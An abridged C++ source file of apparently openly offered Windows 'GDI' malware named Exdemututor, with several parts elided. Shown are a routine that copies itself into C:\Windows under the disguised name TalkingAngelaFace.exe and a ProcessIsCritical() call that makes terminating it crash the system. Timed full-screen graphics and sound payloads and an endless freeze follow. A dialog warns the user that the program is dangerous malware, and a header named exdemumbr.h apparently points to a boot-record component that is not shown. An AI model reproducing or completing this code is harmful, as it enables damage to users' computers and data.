// Exdemututor.cpp : Defines the entry point for the application.
//

#include "Exdemututor.h"
#include "ploadsound.h"
#include "ploadgdi.h"
#include "exdemumbr.h"
...
DWORD WINAPI moveself(LPVOID lpParam) {
    ...
    MoveFileA(pathdel, "C:\\Windows\\TalkingAngelaFace.exe");
    return 1;
}
...
DWORD WINAPI msgbox(LPVOID lpParam)
{
    ...
    MessageBox(NULL, TEXT("Please Wait..."), TEXT("Exdemututor.exe"), MB_ICONINFORMATION);
...
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    ...
    case WM_COMMAND:
        ...
        {
            ShowWindow(hwnd, SW_HIDE); // hide dialog
            ProcessIsCritical();
            ...
            InvalidateRect(0, 0, 0);
            Sleep(100);
            HANDLE gdi11 = CreateThread(0, 0, gdis11::RGDI, 0, 0, 0);
            sfx11();
            Sleep(30000);
            ...
            InvalidateRect(0, 0, 0);
            Sleep(100);
            HANDLE gdi12 = CreateThread(0, 0, gdis12::RGDI, 0, 0, 0);
            sfx12();
            Sleep(30000);
            ...
            InvalidateRect(0, 0, 0);
            Sleep(100);
            HANDLE gdi13 = CreateThread(0, 0, gdis13::RGDI, 0, 0, 0);
            sfx13();
            Sleep(30000);
            TerminateThread(gdi13, 0);
            CloseHandle(gdi13);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            ...
            Sleep(INFINITE); // freeze program
        }
        else if (LOWORD(wParam) == 2) // Exit button
        {
            ExitProcess(0);
        }
        return 0;
    ...
    case WM_PAINT:
    {
        ...
        RECT titleRect = { 10, 10, rect.right - 10, 35 };
        DrawText(hdc, L"Warning!", -1, &titleRect, DT_CENTER | DT_SINGLELINE);

        RECT msgRect = { 10, 40, rect.right - 10, rect.bottom - 40 };
        DrawText(hdc,
            L"this malware is the dangerous, it's harmful pc, sure?",
            -1, &msgRect, DT_CENTER | DT_WORDBREAK);
...
{
    const wchar_t CLASS_NAME[] = L"CustomDialog";
